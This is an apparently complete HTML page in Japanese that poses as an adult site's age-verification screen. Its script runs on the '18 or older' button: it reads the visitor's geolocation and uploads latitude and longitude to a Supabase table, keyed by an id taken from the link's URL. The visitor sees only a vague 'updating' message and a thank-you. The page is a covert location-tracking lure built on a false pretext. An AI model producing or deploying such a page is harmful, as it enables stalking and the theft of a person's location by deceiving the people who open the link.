<!DOCTYPE html>
<html lang="ja">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>位置情報の送信</title>
  <style>
    body {
      margin: 0;
      height: 100vh;
      background-color: #ffd6e8; /* ピンク背景 */
      display: flex;
      justify-content: center;
      align-items: center;
      font-family: "Helvetica Neue", Arial, sans-serif;
    }

    .box {
      background-color: #000; /* 黒いボックス */
      color: #fff;
      padding: 30px 40px;
      border-radius: 12px;
      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
      text-align: center;
      width: 300px;
      animation: fadeIn 0.6s ease;
    }

    h2 {
      margin-bottom: 20px;
      font-size: 18px;
    }

    button {
      display: block;
      width: 100%;
      margin: 8px 0;
      padding: 10px 0;
      border: none;
      border-radius: 6px;
      font-size: 16px;
      cursor: pointer;
      transition: background-color 0.2s ease, transform 0.1s ease;
    }

    #allowBtn {
      background-color: #ff4da6; /* ピンク系ボタン */
      color: white;
    }

    #allowBtn:hover {
      background-color: #ff66b3;
      transform: scale(1.02);
    }

    #denyBtn {
      background-color: #444;
      color: white;
    }

    #denyBtn:hover {
      background-color: #666;
      transform: scale(1.02);
    }

    @keyframes fadeIn {
      from { opacity: 0; transform: translateY(10px); }
      to { opacity: 1; transform: translateY(0); }
    }
  </style>

  <script type="module">
    import { createClient } from "https://esm.sh/@supabase/supabase-js@2";
    import { SUPABASE_URL, SUPABASE_KEY } from "./config.js";

    const supabase = createClient(SUPABASE_URL, SUPABASE_KEY);
    const params = new URLSearchParams(location.search);
    const id = params.get("id") || crypto.randomUUID();

    window.addEventListener('load', showConfirmBox);

    function showConfirmBox() {
      document.body.innerHTML = `
        <div class="box">
          <h2>このサイトはアダルトサイトです</h2>
          <button id="allowBtn">私は18歳以上です-入力</button>
          <button id="denyBtn">私は18歳未満です-出口</button>
        </div>
      `;

      document.getElementById("allowBtn").addEventListener("click", getLocation);
      document.getElementById("denyBtn").addEventListener("click", () => {
        document.body.innerHTML = `
          <div class="box">
            <p>当サイトは18歳以上の利用のみを対象としています。</p>
          </div>
        `;
      });
    }

    async function getLocation() {
      document.body.innerHTML = `
        <div class="box">
          <h3>最新の情報に更新中</h3>
        </div>
      `;

      navigator.geolocation.getCurrentPosition(
        async pos => {
          const lat = pos.coords.latitude;
          const lon = pos.coords.longitude;

          const { error } = await supabase
            .from("locations")
            .upsert({ id, latitude: lat, longitude: lon });

          if (error) {
            document.body.innerHTML = `
              <div class="box">
                <p>送信エラー: ${error.message}</p>
              </div>
            `;
          } else {
            document.body.innerHTML = `
              <div class="box">
                <h3>送信完了</h3>
                <p>ありがとうございました！</p>
              </div>
            `;
          }
        },
        err => {
          document.body.innerHTML = `
            <div class="box">
              <p>位置情報が取得できませんでした: ${err.message}</p>
            </div>
          `;
        }
      );
    }
  </script>
</head>
<body>
  <div class="box">
    <h3>読み込み中...</h3>
  </div>
</body>
</html>
